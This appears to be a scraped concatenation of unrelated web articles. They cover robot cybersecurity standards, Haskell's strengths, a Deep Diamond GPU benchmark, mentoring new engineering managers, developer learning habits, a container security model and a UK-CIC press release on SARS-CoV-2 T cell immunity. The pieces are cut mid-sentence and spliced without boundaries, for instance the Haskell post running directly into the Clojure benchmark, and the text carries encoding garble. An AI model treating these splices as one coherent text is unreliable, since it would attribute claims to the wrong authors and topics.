href="https://github.com/Ff00ff/mammoth-cli">The first beta version is available now</a>.</p><p>Over &amp; out!</p><p>Martijn</p>

		<!--kg-card-begin: markdown--><p>As robots start populating our lives, safety and security are topics gaining more and more traction. Safety cares about the robot not harming the environment (or humans) whereas security deals with the opposite, aims to ensure the environment does not conflict with the robot's programmed behavior. There's an intrinsic connection between safety and security. Functional safety standards reflect this aspect.</p>
<p>Robots have their own networks, technologies, safety requirements and business priorities, all of which must be uniquely addressed. Simply put, you can't secure robots the same way you secure other IT or OT environments. Existing industrial solutions for monitoring networking traffic and detecting threats do not include robots and are generally left beyond the area of protection, assumed as air gapped. From a technical angle <mark>robots demand for their own specialized cybersecurity measures and safety requirements for robots should consider this</mark>. Moreover:</p>
<blockquote>
<p>given the safety implications, cybersecurity in robotics will be more important than in any other area.</p>
</blockquote>
<p>This article discusses briefly the connection between safety and security in robotics, while reasons about how security must be implemented at the robot endpoint to fullfil safety requirements.</p>
<h3 id="safetystandardsrequiresecurity">Safety standards "require" security</h3>
<p><img src="https://cybersecurityrobotics.net/content/images/2020/11/safety_standards.png" alt="safety_standards"></p>
<p><code>IEC 61508</code> “Functional Safety of Electrical/Electronic/Programmable Electronic Safety-related Systems” is a meta-standard for safety and from where most functional safety norms grow. This is the case for <code>ISO 26262</code> (automotive), <code>IEC 61511</code> (industrial processes), <code>IEC 61513</code> (nuclear) or <code>EN 50126/8/9</code> (railways),  among others.</p>
<p><code>IEC 61508</code> indicates the following in <em>section 7.4.2.3</em>:</p>
<p><em>"If the hazard analysis identifies that malevolent or unauthorised action, constituting a security threat, as being reasonably foreseeable, then a security threats analysis should be carried out."</em></p>
<p>Moreover, section 7.5.2.2 from IEC 61508 also states:</p>
<p><em>"If security threats have been identified, then a vulnerability analysis should be undertaken in order to specify security requirements."</em></p>
<p>which translates to security requirements. Note these requirements are complementary to other security requirements specified in other standards like <code>IEC 62443</code>, and specific to the robotic setup in order to comply with the safety requirements of <code>IEC 61508</code>. In other words, <mark>safety requirements spawn from security flaws</mark>, which are specific to the robot and influenced by security research. Periodic security assessments should be performed and as new vulnerabilities are identified, they should be translated into new security requirements.</p>
<blockquote>
<p>Periodic security assessments should be performed and as new vulnerabilities are identified, they should be translated into new security requirements.</p>
</blockquote>
<p>More importantly, the fulfillment of these security requirements to maintain the robot protected (and thereby safe) will demand pushing the measures to the robot endpoint. <mark>Network-based monitoring solutions <sup><a href="#fn1" id="fnref1">[1]</a></sup> will simply not be enough to prevent safety hazards from happening. Safety standards demand thereby for a security mechanism that protects the robot endpoints and fulfill all the security requirements</mark>, a Robot Endpoint Protection Platform (REPP).</p>
<hr>
<section>
<ol>
<li id="fn1"><p>These solutions don't block traffic since the consequences of package loss in control systems could be catastrophic. While they don't directly prevent safety hazards, their detection and monitoring capabilities are crutial for an active security posture and maintenance. Robot-specific solutions are thereby required that co-exist with industrial network monitoring solutions, expanding the overall security posture and further implementing a defense-in-depth strategy. <a href="#fnref1">↩︎</a></p>

<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h3 id="cybersecuritymeasuresattheendpoint">Cybersecurity measures at the endpoint</h3>
<p>At <a href="https://aliasrobotics.com/">Alias Robotics</a> we've been researching the landscape of robot cybersecurity for a few years already while working with some of the top manufacturers of robot parts. Altogether, we have discovered, identified and catalogued more than 1000 robot vulnerabilities throughout various <a href="https://aliasrobotics.com/case-studies-robot-cybersecurity.php">offensive exercises</a>. Our products build on top of this reseach and aim to help guarantee the security of robots by directly embedding security measures at the robot endpoint. <strong>We develop software and hardware that adapts to the robot and fits directly inside, without compromising its behavior and adding additional layers of cybersecurity protection</strong>.</p>
<!--

The closest norm that defines a series of cybersecurity requirements and is applicable to robots is `IEC 62443`. This standard defines requirements that  *components* and *systems* must meet to guarantee a minimum `security level` (SL) which goes from 0 to 4 (with 0 being no fulfillment of security requirements).

For a robot to guarantee a security level (SL) on its operation, it will need to meet `IEC 62443` [^1] at both system and component levels. Moreover, as pointed out above, security flaws are specific to the robot and influenced by security research. Each one of these flaws becomes a new security requirement, which needs to be mitigated requiring a security management process. 


[^1]: Refer to IEC 62443 3-3 and 4-2 for system and component requirements, respectively.

<p>RIS is currently available for several robots such as those from Universal Robots (UR) or Mobile Industrial Robots (MiR). It can also secure robot components including several of the distros of ROS or ROS 2. Most exciting fact is that <strong>RIS is fulfilling all the requirements of <code>IEC 62443</code> cybersecurity standard rapidly</strong>!</p>
<p>We are in the process of turning RIS into a security certified product for robots so stay tuned if you're intested in a security upgrade for your robots ;).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.

A few weeks ago I've shown you how simple Clojure's
<a href="https://github.com/uncomplicate/deep-diamond">Deep Diamond</a>() is, even compared to Keras. I've also mentioned
that it's superfast. Here's how fast it is on the GPU!
</p>

<div id="outline-container-orgc0a2ae3">
<h2 id="orgc0a2ae3">TL;DR Much faster than Keras+TensorFlow on the GPU, too!</h2>
<div id="text-orgc0a2ae3">
<p>
In the <a href="https://dragan.rocks/articles/20/Going-faster-than-TensorFlow-with-Clojure">previous article</a>, we have only compared the libraries on the CPU.
Deep Diamond was considerably faster: 368 seconds vs 509 seconds. Most readers were intrigued,
but, being skeptical as they should be, they complained that CPU performance doesn't matter
anyway, since everybody uses GPU for training convolution networks;
let's do the GPU comparison then.
</p>

<p>
Both Deep Diamond, and Keras with TensorFlow, use <a href="https://developer.nvidia.com/cudnn">Nvidia's cuDNN</a> low level performance
library under the hood, and any difference is due to the higher-level implementation.
</p>

<p>
Deep Diamond completes this training in <b>21</b> seconds while Keras + TensorFlow takes <b>35</b> seconds.
The gap even increased in favor of Deep Diamond! Now the ratio is <b>1.67</b>, in place of 1.38 on the CPU.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-baseweb="block"><p data-baseweb="block">Transitioning from a software engineering position to a managerial one can be quite a leap. The roles are drastically different from one another, and without mentors, it can be a daunting task. It's our job as engineering leaders help new managers navigate the change. This article offers a few practical tips you can follow to help new engineering managers succeed.</p><p data-baseweb="block">Whenever I start coaching new managers, the first thing I do is set up a recurring time to meet, talk about progress, and provide feedback. Similar to the <a data-baseweb="link" href="https://nemethgergely.com/blog/meaningful-1-1#keep-record-of-your-1-1s">1:1s I do with team members</a>, I keep track of these conversations in a shared document. This gives us a place where we can record our progress and assign action items to each other. During these 1:1s, I tend to focus on the areas detailed below.</p><h2 data-baseweb="block" id="preparing-for-1-1s">Preparing for 1:1s <a href="#preparing-for-1-1s"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2><p data-baseweb="block"><strong>One of the first tasks a new manager will undertake is to hold regular 1:1s with their team members.</strong> For most people it will be the first time they sat on the other side of the table. I believe 1:1s are the most important meetings I have during the week, as they allow me to build connections with team members. I find it essential that we prepare first-time managers for their first 1:1s.</p><p data-baseweb="block">As part of this exercise, we examine what the first few 1:1s might include, and how they can best prepare. I ask them to think about their questions their team members are most likely to ask:</p><ul><li data-baseweb="block">What are your expectations for me?</li><li data-baseweb="block">What's your vision for the team?</li></ul><p data-baseweb="block">New managers should also prepare a few questions for their team members, on topics like their preferred way to receive praise, or their preferred way to communicate:</p><ul><li data-baseweb="block">How do you like to receive recognition? Are you okay with occasional public praise?</li><li data-baseweb="block">How do you prefer to receive critical feedback?</li><li data-baseweb="block">Do you have any clear career goals I can help you achieve?</li><li data-baseweb="block">What's one thing you really liked and disliked about your work relationship with your previous manager?</li></ul><p data-baseweb="block">It helps build an honest relationship between first-time managers and their team members if the manager acknowledges in their first 1:1s that she is new to management, and may need some help growing into the position. This small act contributes to healthy feedback culture within the team.</p><div data-baseweb="block"><p>Do you like this article?

You can't live long enough to make them all yourself," as the saying goes. I believe reading about management can accelerate one's journey into becoming comfortable at it, especially for understanding how things can go wrong.</p><p data-baseweb="block">I recommend picking a book on management and studying it with your mentee. You can meet when youâ€™ve both had the time to read the next chapter and discuss it in depth. Ask your mentee to summarize the takeaways from that chapter, and bring questions they want to discuss. Also, prepare a few questions about what was most important for you in that chapter.</p><p data-baseweb="block">I usually go with <strong>The Manager's Path</strong> by <a data-baseweb="link" rel="noopener" href="https://www.camilletalk.com/" target="_blank">Camille Fournier</a>.</p><h2 data-baseweb="block" id="start-slowly">Start slowly <a href="#start-slowly"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2><p data-baseweb="block">If possible, let new managers start with a handful of people.</p><p data-baseweb="block">First, this gives them the opportunity to transition slowly from their role as an individual contributor to a manager, and give them a chance to continue writing <a data-baseweb="link" href="https://nemethgergely.com/blog/coding-as-an-engineering-manager">code as an engineering manager</a>. However, it's important to emphasize it's no longer their primary role, so it canâ€™t take precedence over their managing responsibilities.</p><p data-baseweb="block">Starting slowly also gives new engineering managers time to learn their duties. They'll have a better sense of how to prioritize their time once theyâ€™ve seen a few product planning cycles and performance and promotion seasons.</p><h2 data-baseweb="block" id="be-patient">Be patient <a href="#be-patient"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2><p data-baseweb="block">Remember all the mistakes you made as a new manager?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


			
<p>Two reasons provoked this article â€“ my <a href="https://ddimitrov.dev/2020/10/07/tutorial-hell/">previous article</a> and a recent Twitter post asking, “How do you learn new technologies?”.</p>



<p>In the next paragraphs, I will try to explain how I see learning should happen. Please have in mind that what I suggest is not for total beginners currently learning basics as “if statements” and variables.</p>



<h2><strong>Young developer with great ideas</strong></h2>



<p>And not that great ones. When you are inexperienced, everything is new to you. Everything is exciting, and you want to try everything. It is a lot easier to jump on the hype train for something new.</p>



<p>Always learning new things is excellent, but it isn’t that good for a novice developer in the long run.</p>



<p>I remember how I wanted to learn C++ and OpenGL, .NET ASP, Python at the same time. I had many “cool” ideas for different projects. I tried, and of course, I failed.</p>



<p>I was jumping from technology to technology and never got some depth.</p>



<p>Some of you will start something new just because it is the new cool thing. Others will face something hard and will think that the new technology will not be that hard. No matter the reason, losing focus and always staying on the base level is the worst thing you can do.</p>



<h2><strong>Beginners have to learn fundamentals</strong></h2>



<p>Even If you are new to programming, It is hard to get wrong with the technology stack. But the technology stack is not the most important thing. The best you can do is choose one, stick with it, and learn all computer science and software engineering fundamentals. By fundamentals, I mean things like â€“ data structures and algorithms, programming paradigms, good software architecture and design, software development best practices, etc.</p>



<p>But only learning will not help you. You have to practice what you have learned. Here things become a little bit tricky.</p>



<p>It will be hard for you to find a real project to practice what you have learned.</p>



<p>If you are part of a team at work, rarely technical decisions will come by you just because there will be more experienced programmers. Yes, you will learn from them, but this is not the same. You have to make decisions.</p>



<p>If you start your practice project, you will lack real business cases and supervision. Lacking real business cases and control is a recipe for doing things the wrong way and understanding it too late.</p>



<p>My advice to you is to start your practice project but also to find an experienced mentor. Try to create something helpful. Make your own decisions and see how they fit. After you are ready with a specific coding part, ask your mentor how it could be done better, how he would do it. What is the idea behind his implementation, and what you gain by it.</p>



<p>For me, things didn’t go that way. Soon I understood that I have to stick to a specific technology and try to learn the core of that science, but I was missing a mentor. That’s why I made many mistakes. Mistakes I don’t want you to make.</p>



<h2><strong>Doing it the right way</strong></h2>



<p>After you have gained some experience in several years, you will understand that there are no right and wrong. Everything depends on the current problem you are trying to solve. You will also see that most good practices are not imperative, that sometimes “little bow of mud” is ok and that the perfect software exists only in books.</p>



<p>The essential thing that you will learn is that you can not know everything, and that is ok. You will also quickly understand that there is no point in learning something if you are not practicing it.</p>



<p>Don’t get me wrong. You should always watch out for new trending concepts, ideas, and cool technologies but only get invested when you need to.</p>



<p>Using the solid foundation you have built will be a lot easier to learn something new. So if you need, for example, to learn Angular, then focus only on that and invest all of your attention.</p>



<p>Beginners tend to jump from technology to technology without learning it in-depth, while experienced developers learn many things and forget most of them because they don’t practice them.</p>



<p>As a developer with 12 years of experience, I had the same problem. I felt constant anxiety that if I don’t learn something (even not having a way to practice it), I will be less competitive in the labor market. Of course, I was wrong, and I wasted valuable time realizing it.</p>



<p>Over the years, I managed to implement many projects using technologies that I had not known before. What helped me was the experience and strong fundamentals that I had.</p>



<p>Take a side/practice project and work on it, but don’t get ten of them ðŸ˜Š.&nbsp; For example, If on your daily job you work with ASP.NET Core, while on evenings and weekends you play with NodeJS and Express, that is more than enough.</p>



<p>Let your project be something for the long term, not another <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete" target="_blank" rel="noreferrer noopener">CRUD</a> project, which you will finish in three days. Challenge yourself!</p>



<p>As you can see, novice and experienced developers make similar mistakes but for different reasons.</p>



<p>The worst thing you can do is sit in front of the TV after coming back from work…</p>



<h2><strong>Learning sources</strong></h2>



<p>Nowadays, you can become a software developer in many different ways â€“ <a href="https://ddimitrov.dev/category/good-books-to-read/">books</a>, online courses, tutorials, coding academies, boot camps, etc.&nbsp;</p>



<p>For a beginner, I suggest you start with the good old books. There are great authors from which you can learn all the fundamentals. Some of these authors are â€“ Charles Leiserson, Donald Knuth, Steve McConnell, Martin Fowler, Kent Beck,&nbsp; Robert Martin, Erick Evans, Erich Gamma, and others.</p>



<p>(I promise in a later article I will try to make a list of my top 10 books)</p>



<p>You can use almost anything from the official documentation to online tutorials to learn a technology stack. Still, my advice is to find something systematized â€“ a series of online tutorials or a video course is a great choice. &nbsp;</p>



<p>I do not recommend learning technology stack from a book because these books get obsolete very quickly.</p>



<p>Also, it is crucial to follow what’s new with the current technologies you work with. The best way you can do this is to subscribe to the official blogs, join online communities, and be an active member.</p>



<p>Things do not differ much for experienced developers.</p>



<p>In addition to the advice above – the best thing you can do is to challenge and broaden your views. Read books about ideas you have not experienced before, learn case studies and white papers, and, last but not least, try to give your contribution to the community.</p>



<p>No matter your level, becoming a good developer requires time, a lot of time.</p>

        <div>
            <p>Securing containers is a complex task.  The problem space is broad, vendors are on fire, there are tons of checklists and best practices and it’s hard to prioritize solutions. So if you had to <strong>implement a container security strategy</strong> where would you start?</p>

<p>I suggest to start from the basics: understanding <strong>what container security is about</strong> and build a model to navigate risks.</p>

<h2 id="follow-the-devops-life-cycle">Follow the DevOps Life Cycle</h2>

<p>Every security initiative is eventually constrained by where security controls can be implemented, so I find practical to just follow the standard DevOps life cycle to <em>surface patterns™</em> and <em>unlock synergies™</em>.</p>

<p>The DevOps Lifecycle is an infinite iteration of:</p>

<ul>
<li>Plan</li>
<li>Code</li>
<li>Build</li>
<li>Test</li>
<li>Release</li>
<li>Deploy</li>
<li>Operate</li>
<li>Monitor</li>
</ul>

<p><img src="https://cloudberry.engineering/devops-lifecycle.jpg" alt="DevOps Lifecycle - source: ryadel.com"></p>

<p>Containers are included in the application in the form of a Dockerfiles but are not really part of it. As such they don’t interest the planning and coding phase.</p>

<p><em>(no, writing Dockerfiles is not coding.)</em></p>

<p>Every other step is in scope from a security point of view, and I would group them like this:</p>

<ul>
<li><strong>Build Time</strong>: build, test and release.</li>
<li><strong>Container Infrastructure</strong>: deploy and operate.</li>
<li><strong>Runtime</strong>: monitor.</li>
</ul>

<p>Why? Every security strategy is only effective if it can be implemented. And every step in each group share a common facility where security controls can be injected without adding much friction:</p>

<ul>
<li>Build Time: The CI/CD infrastructure, the container registry</li>
<li>Container Infrastructure: the container orchestrator</li>
<li>Runtime: the production environment</li>
</ul>

<p>Now we have three macro areas we can use as a starting point to do our risk assessments.</p>

<h2 id="security-at-build-time">Security at Build Time</h2>

<p>At build time we have in input a bunch of source files and a Dockerfile, and we get as output a Docker image.</p>

<p>This is where most vendors tend to cluster while trying to sell you the narrative of the importance of scanning container images and calling it a day.  Container security scanning is important, yes, but it’s not enough.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>minimize the risk of supply chain attacks.</li>
</ul>
</div>


<h3 id="container-images-hygiene">Container Images Hygiene</h3>

<p>First, decide how your images should look like, with a focus on how software dependencies are introduced:</p>

<ul>
<li>what base images are developers allowed to use?</li>
<li>are software dependencies pinned? From where are they pulled?</li>
<li>are there any labels that are needed to simplify governance and compliance?</li>
<li>lint the Dockerfile</li>
<li>follow <a href="https://cloudberry.engineering/article/dockerfile-security-best-practices/">Dockerfile security best practices</a></li>
</ul>

<p>All of these checks are static and can be implemented for cheap as a step in the build pipelines.</p>

<h3 id="container-images-scanning">Container Images Scanning</h3>

<p>Then we can move into scanning the container image.</p>

<p><strong>Do not scan the image as a step in the build pipeline</strong>, instead setup continuous scanning in the container registry.</p>

<p>Why? Vulnerabilities are continuously discovered while your services are not necessarily continuously built. Secondly, builds are additive: every build will generate a new image. So, assuming  your container orchestrator trust your registry, every tag you publish can always be deployed and need to be assessed.</p>

<p><em>(It’s also very slow to scan at build time)</em></p>

<p>This is where you start thinking about defining <strong>patch management</strong> and <strong>shelf life</strong> processes:</p>

<ul>
<li>patch management: results from the scanning will feed a patching process that will result in a new version of the image</li>
<li>shelf life: unpatched/old/unsafe images are deleted from the registry</li>
</ul>

<p><em>(next article will be about how to choose a container scanning solution, if you are facing the dilemma right now feel free to <a href="mailto:hello@clouberry.engineering">ping me</a>)</em></p>

<h2 id="container-infrastructure-security">Container Infrastructure Security</h2>

<p>The container infrastructure is comprised of all the moving parts that are in charge of pulling your images from the registry and run them as containers in production.</p>

<p>It’s mostly going to be the container orchestrator – <em>*cough* kubernetes *cough*</em>.</p>


<div>
<p><strong>This stage goals</strong>:</p>

<ul>
<li>Avoid platform misconfigurations with security implications</li>
<li>Minimize the <strong>breadth</strong> of an attack from a compromised container</li>
</ul>
</div>


<h3 id="security-of-the-infrastructure-misconfigurations">Security OF the Infrastructure: Misconfigurations</h3>

<p>Container orchestrators are complex, Kubernetes in particular. As of now they fail the promise of DevOps and I think we are still an abstraction layer (or two) away from being a mainstream solution without too much operational overhead.</p>

<p>Every complex platforms is prone to be misconfigured, and this is the part you want to focus on.</p>

<p>You have to threat model your infrastructure to <strong>ensure it can’t be abused</strong>.
This particular thread model should focus on every actor but a compromised container (we will cover that next).</p>

<p>I can’t go into details here, because it really depends on what you are running. For Kubernetes a good starting point for threat modelling is <a href="https://www.marcolancini.it/2020/blog-kubernetes-threat-modelling/">this</a>.</p>

<p>Additionally, if you are not doing it yet, this is also a <strong>good argument in favour of using a managed platform</strong>: the complexity is reduced if you can leverage a shared responsibility model with your (trusted) provider.</p>

<h3 id="security-in-the-infrastructure-lateral-movements">Security IN the infrastructure: Lateral Movements</h3>

<p>Next we can talk about what happens when a container is compromised.</p>

<p>You want to minimize the <a href="https://cloudberry.engineering/article/lateral-movement-cloud/">attacker’s ability to move laterally</a>, focusing on these two layers:</p>

<ul>
<li>The network layer</li>
<li>The Identity and Access management (IAM) layer</li>
</ul>

<p><strong>The network should not be flat</strong>. You can start by brutally segment everything into subnetworks and work your way up to a full fledge service meshes.</p>

<p>On the IAM layer work your way toward having a <strong>single identity for each container</strong> in order to fine tune the authorization grants. This is particularly important in multi tenant platforms: without granular identities it’s impossible to achieve least privilege.</p>

<p><em>(Google Kubernetes Engine (GKE) has a nifty feature for this called <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity">Workload Identity</a>)</em></p>

<p>Finally, since they are supposed to be immutable, a wonderful strategy would be to <strong>reduce the amount of time containers can run</strong>: the window of opportunity for attackers to move laterally and gain persistence is as long as the container running lifetime. Continously shut down and spin up your containers.</p>

<p>And this final consideration allow me to smoothly move into the next area.</p>

<h2 id="runtime-security">Runtime Security</h2>

<p>The last piece of the puzzle is the security of your running workloads.
At this point most of the hardening is done and here is when we move into the realm of reactive security controls, the grim land of <strong>post-fail</strong>.</p>


<div>
<p><strong>This stage goal</strong>:</p>

<ul>
<li>is to minimize the <strong>impact</strong> of an attack from a compromised container.</li>
</ul>
</div>


<h3 id="detection-and-incident-response">Detection and Incident Response</h3>

<p>The best way to control the impact of an attack is to minimize the time between the breach to when the security team is alerted.</p>

<p>Detecting an ongoing breach is another area where vendors are scrambling to find a silver bullet. There are many approaches, most of them will require side cars and/or daemon sets actively monitoring pod’s traffic and system calls.</p>

<p>Most solutions will provide some value but my advice is to start simple and iterate: use your existing SIEM, ingest your platform, application and audit logs.</p>

<p><strong>Incidents will happen</strong>, and it’s fine: have an incident response process.</p>

<p>The first bullet point of every post-mortem should be: <em>“how can we detect this quicker next time?”</em> answering will allow you to identify your blind spots, which you can then use to understand what signals you are missing and what makes sense to buy.</p>

<h2 id="conclusion">Conclusion</h2>

<p>Container security is a broad problem and it is not just about scanning images.</p>

<p>This is the model I built and used to reason about container risks and solutions. It’s very high level and of course, as with every model, <strong>it’s not necessarily the right one</strong>.</p>

<p>We all know that in reality each infrastructure is a snowflake: so start with your own threat model and use this one <strong>as an inspiration</strong>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img alt="UK-CIC logo" data-entity-type="file" data-entity-uuid="8a702f0f-0ed4-43c4-b10a-d98dba34a018" src="https://www.uk-cic.org/sites/default/files/inline-images/UK-CIC%20logo%20square%20300pix.jpg">Cellular (T cell) immunity against SARS-CoV-2 is likely to be present within most adults six months after primary infection, a new pre-print on bioRxiv suggests. The research from the UK Coronavirus Immunology Consortium (UK-CIC), Public Health England and Manchester University NHS Foundation Trust&nbsp;demonstrates robust T cell responses to SARS-CoV-2 virus peptides at this timepoint in all participants following asymptomatic or mild/moderate COVID-19 infection.</p>

<p>A key question is whether previous infection with SARS-CoV-2 results in immunity to reinfection, and if so for how long. The immune system is extremely complex and there are many different potential routes whereby it can generate immunity to a disease post-infection. This study examines the role of T cells in contributing to immunity against SARS-CoV-2 at six months post infection.</p>

<p>As part of UK-CIC, researchers from the University of Birmingham, Public Health England, Manchester University NHS Foundation Trust (MFT) and&nbsp;NIHR Manchester Clinical Research Facility collected serum and blood samples from a cohort of more than 2,000 clinical and non-clinical healthcare workers including 100 individuals who tested sero-positive for SARS-CoV-2 in March/April 2020 (average age 41 (range 22–65); 23 men, 77 women). All 100 individuals experienced either mild/moderate symptoms or were asymptomatic (56 versus 44 people) and none were hospitalised for COVID-19. Serum samples were collected monthly to measure antibody levels, and blood samples were taken after six months to assess the cellular (T cell) response. A range of analyses were carried out to assess different aspects of the T cell response including the magnitude of response and the response to different proteins from SARS-CoV-2. Carrying out these cellular analyses is much more complex than antibody studies – but this study of 100 individuals is one of the largest in the world to date in this field.</p>

<p>T cell responses were present in all individuals at six months after SARS-CoV-2 infection. The cellular immune response was directed against a range of proteins from the virus, including the Spike protein that is being used in most vaccine studies. However, comparable immunity was present against additional proteins, such as nucleoprotein, which suggests that these may be of value for incorporation in future vaccine protocols. This indicates that a robust cellular memory against the virus persists for at least six months.</p>

<p>The size of T cell response differed between individuals, being considerably (50%) higher in people who had experienced symptomatic disease at the time of infection six months previously. Further research will be needed to determine the significance of this finding. It is possible that heightened cellular immunity might provide increased protection against re-infection in people with initial symptomatic infection, or that asymptomatic individuals are simply able to fight off the virus without the need to generate a large immune response.</p>

<p>Antibodies are also a crucial component of immune defence and cellular immunity was strongly correlated with the peak level of the antibody response. Furthermore, larger cellular responses appeared to protect against antibody ‘waning’ over time, again suggesting the need to ensure that cellular immune responses are elicited in vaccine regimens.</p>

<p>Overall, these findings indicate a robust cellular (T cell) immune response against SARS-CoV-2 at six months post-infection. These findings will feed not only into our understanding of how immunity to SARS-CoV-2 works but also help inform future vaccine strategies. Further research is now needed to assess whether this immune response is maintained over the longer term and to better understand how strength of cellular immune response corresponds to likelihood of reinfection.</p>



<p><b>Professor Paul Moss, UK Coronavirus Immunology Consortium lead from University of Birmingham, said:</b></p>

<blockquote>
<p>“Understanding what constitutes effective immunity to SARS-CoV-2 is extremely important, both to allow us to understand how susceptible individuals are to reinfection and to help us develop more effective COVID-19 vaccines.</p>

<p>“To our knowledge, our study is the first in the world to show robust cellular immunity remains at six months after infection in individuals who experienced either mild/moderate or asymptomatic COVID-19. Interestingly, we found that cellular immunity is stronger at this time point in those people who had symptomatic infection compared with asymptomatic cases. We now need more research to find out if symptomatic individuals are better protected against reinfection in the future.</p>

<p>“Our knowledge of SARS-CoV-2 infection is increasing all the time. While our findings cause us to be cautiously optimistic about the strength and length of immunity generated after SARS-CoV-2 infection, this is just one piece of the puzzle. There is still a lot for us learn before we have a full understanding of how immunity to COVID-19 works. While we increase our understanding, whether we think we have previously had COVID-19 or not, we all should still follow Government guidelines on social distancing to ensure we play our part in minimising the spread of COVID-19 within our communities.”</p>
</blockquote>



<p><b>Dr Shamez Ladhani, Consultant epidemiologist at Public Health England and the study’s author, said:</b></p>

<blockquote>
<p>“Cellular immunity is a complex but potentially very significant piece of the COVID-19 puzzle, and it’s important that more research be done in this area. However, early results show that T-cell responses may outlast the initial antibody response, which could have a significant impact on COVID vaccine development and immunity research.</p>

<p>“Our thanks go to the more than 2,000 staff who have volunteered to provide monthly blood samples since the beginning of the pandemic. Recruiting donors so early in 2020 allowed us significantly longer follow-up than many similar studies have achieved so far.”</p>


</blockquote>

<p><b>Professor Fiona Watt, Executive Chair of the Medical Research Council, part of UKRI, said: </b></p>

<blockquote>
<p>“This study shows the benefit of funding world-leading immunologists through the UK Coronavirus Immunology Consortium. Researchers investigated whether previous infection with SARS-CoV-2 results in immunity to reinfection. They found that a robust cellular memory against the virus persists for at least six months. This is promising news – if natural infection with the virus can elicit a robust T cell response then this may mean that a vaccine could do the same.”</p>
</blockquote>



<p><strong>Dr Shazaad Ahmad, Consultant Virologist at Manchester University NHS Foundation Trust (MFT) and Principal Investigator for the study at MFT, said:&nbsp;</strong></p>

<blockquote>
